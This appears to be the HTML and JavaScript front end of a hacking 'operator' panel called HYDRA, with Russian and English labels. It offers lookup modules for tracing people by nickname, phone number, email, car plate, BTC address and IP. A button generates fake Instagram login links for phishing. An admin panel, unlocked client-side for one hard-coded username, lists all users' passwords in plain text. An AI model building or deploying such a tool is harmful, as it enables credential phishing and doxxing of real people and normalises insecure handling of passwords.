<!DOCTYPE html>
<html>
<head>
    <title>HYDRA SYSTEM V15.5</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: monospace; padding: 20px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .card { border: 1px solid #00ff41; padding: 10px; background: rgba(0,255,0,0.05); }
        .card-label { color: #ff3e3e; font-size: 10px; display: block; margin-bottom: 5px; }
        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 5px; width: 70%; }
        .btn { background: #00ff41; color: #000; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; }
        #console { border: 1px solid #333; height: 150px; overflow-y: auto; padding: 10px; margin-top: 20px; font-size: 12px; }
        #main-ui { display: none; }
    </style>
</head>
<body>
    <h2>HYDRA SYSTEM OPERATOR</h2>

    <div id="auth-ui" class="card">
        <input id="user" placeholder="LOGIN">
        <input id="pass" type="password" placeholder="PASSWORD">
        <button class="btn" onclick="auth('login')">ВХОД</button>
        <button class="btn" onclick="auth('register')">РЕГ</button>
    </div>

    <div id="main-ui">
        <div class="grid">
            <div class="card"><span class="card-label">// ШЕРЛОК (НИКНЕЙМ)</span><input id="t-nick"><button class="btn" onclick="run('nick')">ПОИСК</button></div>
            <div class="card"><span class="card-label">// ГЛОБАЛЬНЫЙ ПРОБИВ НОМЕРА</span><input id="t-mail"><button class="btn" onclick="run('mail')">ИНФО</button></div>
            <div class="card"><span class="card-label">// EMAIL DEEP SCAN</span><input id="t-email"><button class="btn" onclick="run('email')">SCAN</button></div>
            <div class="card"><span class="card-label">// CAR PLATE CHECK</span><input id="t-car"><button class="btn" onclick="run('car')">CHECK</button></div>
            <div class="card"><span class="card-label">// CRYPTO BTC CHECKER</span><input id="t-btc"><button class="btn" onclick="run('btc')">CHECK</button></div>
            <div class="card"><span class="card-label">// IP ТРАССИРОВКА</span><input id="t-ip"><button class="btn" onclick="run('ip')">СЛЕДИТЬ</button></div>
        </div>
        
        <button class="btn" onclick="genPhish()" style="width:100%; margin-top:10px; background:#ff3e3e; color:#fff;">СГЕНЕРИРОВАТЬ ИНСТА-ЭКСПЛОИТ</button>

        <div id="console">> СИСТЕМА ОЖИДАЕТ КОМАНДЫ...</div>
        
        <div id="admin-panel" style="display:none; margin-top:10px;">
            <button class="btn" onclick="loadAdmin()" style="width:100%; border:1px solid gold;">OPEN MASTER ADMIN PANEL</button>
            <div id="admin-data"></div>
        </div>
    </div>

    <script>
        async function auth(type) {
            const u = document.getElementById('user').value, p = document.getElementById('pass').value;
            const r = await fetch(`/api/${type}`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:u, password:p})});
            const j = await r.json();
            if(j.status==='success') {
                if(type==='login') {
                    document.getElementById('auth-ui').style.display = 'none';
                    document.getElementById('main-ui').style.display = 'block';
                    if(u === 'abupaay') document.getElementById('admin-panel').style.display = 'block';
                } else alert('УСПЕШНО!');
            } else alert(j.message);
        }

        async function run(mod) {
            const val = document.getElementById('t-'+mod).value;
            const r = await fetch(`/api/scan?mod=${mod}&target=${val}`);
            const j = await r.json();
            document.getElementById('console').innerHTML += `<div>[${mod.toUpperCase()}] FOUND DATA FOR: ${val}</div>`;
        }

        function genPhish() {
            const link = window.location.origin + '/login/insta/' + Math.floor(Math.random()*1000);
            document.getElementById('console').innerHTML += `<div style="color:yellow;">LINK: ${link} (COPIED)</div>`;
        }

        async function loadAdmin() {
            const r = await fetch('/api/admin/users');
            const j = await r.json();
            document.getElementById('admin-data').innerHTML = j.map(u => `<div><b>${u.u}</b>:${u.p} | [${u.act.join(",")}]</div>`).join("");
        }
    </script>
</body>
</html>
